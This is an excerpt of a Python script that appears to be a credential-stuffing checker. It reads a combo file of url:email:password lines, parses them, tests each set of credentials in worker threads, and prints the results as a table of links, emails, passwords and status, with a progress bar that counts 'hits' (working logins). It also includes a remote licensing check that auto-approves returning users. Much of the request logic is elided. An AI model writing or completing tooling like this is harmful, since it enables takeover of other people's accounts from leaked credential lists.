...
def progress(cur, tot, label="", hits=0):
    if tot<=0: return
    pct = int((cur/tot)*100)
    filled = int(30*cur/tot)
    bar = f"{G}{'█'*filled}{DIM}{'░'*(30-filled)}{RES}"
    hits_str = f"{G} — {hits} HIT{'S' if hits!=1 else ''}{RES}" if hits > 0 else ""
    sys.stdout.write(f"\r  {label} |{bar}| {pct}% ({cur}/{tot}){hits_str}   ")
    sys.stdout.flush()
...
def send_request(name):
    ...
    try:
        ...
        if r.status_code == 201:
            initial_status = r.json().get("status", "pending")
    except:
        pass
    return token, initial_status
...
def main():
    ...
    token, initial_status = send_request(name)

    if initial_status == "approved":
        os.system('clear')
        center_print("RETURNING USER DETECTED", C)
        center_print("AUTO-APPROVED", G)
        time.sleep(1.2)
    else:
    ...
    while True:
        ...
        if choice=='1':
            ...
            with open(combo_file,'r',encoding='utf-8',errors='ignore') as f:
                for line in f:
                    ...
                    if '|' in line:
                        ...
                        # url:email:password — URL contains :// so split carefully
                        parts = line.split(':')
                        # parts[0]='https', parts[1]='//domain/path', parts[2]=email, parts[3:]=password
                        if len(parts) >= 4:
                            url = parts[0] + ':' + parts[1]
                            email = parts[2]
                            password = ':'.join(parts[3:])
                            combos.append((url.strip(), email.strip(), password.strip()))
                    else:
                        parts = line.split(':')
                        if len(parts) >= 3:
                            combos.append((parts[0].strip(), parts[1].strip(), ':'.join(parts[2:]).strip()))
            ...
            sep = f"  {DIM}{'─'*90}{RES}"
            header = f"  {Y}{'LINK':<35} {'|'} {'USER/EMAIL':<28} {'|'} {'PASS':<20} {'|'} {'STATUS'}{RES}"
            print(header)
            print(sep)
            def worker(url,email,passwd):
                ...
                with lock:
                    ...
                    email_ = res['email'][:26]
                    pass_  = res['pass'][:18]
                    print(f"  {W}{link:<35}{DIM} | {RES}{W}{email_:<28}{DIM} | {RES}{W}{pass_:<20}{DIM} | {RES}{act_str}")
                    progress(done, total, "Checking", hits=active)
